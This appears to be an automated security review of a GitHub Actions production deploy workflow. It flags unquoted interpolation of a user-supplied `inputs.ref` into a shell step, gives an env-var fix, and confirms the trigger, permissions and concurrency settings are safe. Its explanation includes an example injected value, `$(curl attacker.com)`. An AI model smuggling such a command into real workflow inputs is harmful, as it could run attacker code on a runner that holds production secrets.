# Security Minion Review

**Verdict: ADVISE**

---

- [security]: Shell injection vector in traceability log step -- `inputs.ref` interpolated directly into a `run:` shell command without quoting.
  SCOPE: `.github/workflows/deploy-production.yml` -- traceability logging step in the deploy job
  CHANGE: Quote all `${{ ... }}` expressions used in shell `run:` steps. The plan's proposed snippet is:
  ```yaml
  echo "Deploy ref: ${{ inputs.ref || github.event.workflow_run.head_sha || github.sha }}"
  ```
  This must be written as an env-var pattern to avoid shell injection:
  ```yaml
  - name: Log deploy context
    env:
      DEPLOY_REF: ${{ inputs.ref || github.event.workflow_run.head_sha || github.sha }}
      STAGING_RUN_URL: ${{ github.event.workflow_run.html_url || 'N/A (manual dispatch)' }}
    run: |
      echo "Trigger: ${{ github.event_name }}"
      echo "Deploy ref: $DEPLOY_REF"
      echo "Staging run: $STAGING_RUN_URL"
  ```
  `github.event_name` is a GitHub-controlled enum value (safe to interpolate directly). `inputs.ref` is user-supplied and must go through env.
  WHY: `inputs.ref` accepts arbitrary strings via `workflow_dispatch`. A value containing shell metacharacters (e.g., `$(curl attacker.com)`, backticks, semicolons) interpolated directly into a `run:` shell block executes as shell code in the runner context. The runner has access to production secrets (`CLOUDFLARE_API_TOKEN`). This is a textbook CWE-78 command injection via GitHub Actions expression injection -- a well-documented attack class (GitHub's own hardening guide calls this out explicitly). The fix is zero-cost: assign user-supplied expressions to env vars and reference them as `$VAR_NAME` in the shell.
  TASK: Task 1

---

## Non-Issues (confirmed safe)

The following were specifically requested for review and are not concerns:

**`workflow_run` trigger manipulation**: `workflow_run` on a private repo fires only on completion of the named workflow (`"Deploy to Staging"`) within the same repository, filtered to `branches: [main]`. An external actor cannot trigger this workflow. Fork PRs do not affect it. This is strictly more restrictive than the current `push` trigger.

**Permissions after trigger change**: The existing `contents: read` + `deployments: write` permission block is unchanged and correct. `workflow_run` does not require additional permissions. Notably, `workflow_run` workflows run with the permissions of the *default branch workflow definition* (not the triggering commit), which is a security improvement over `push` -- it prevents a compromised PR from escalating permissions via workflow file modification.

**Ref resolution chain (`inputs.ref || head_sha || github.sha`)**: The fallback chain is sound from a security standpoint. `github.event.workflow_run.head_sha` is a GitHub infrastructure value (not user-supplied), representing the SHA that completed the staging workflow -- it cannot be externally manipulated beyond what any maintainer-level push to main already allows. The only user-supplied value is `inputs.ref` (rollback path via `workflow_dispatch`), which requires `workflow_dispatch` permission (i.e., repo write access). The concern above is about that value's handling in shell, not its presence in the chain.

**Concurrency group**: `group: deploy-production` is a static string literal. No injection surface. `cancel-in-progress: false` is correct for deploys (queue rather than cancel).
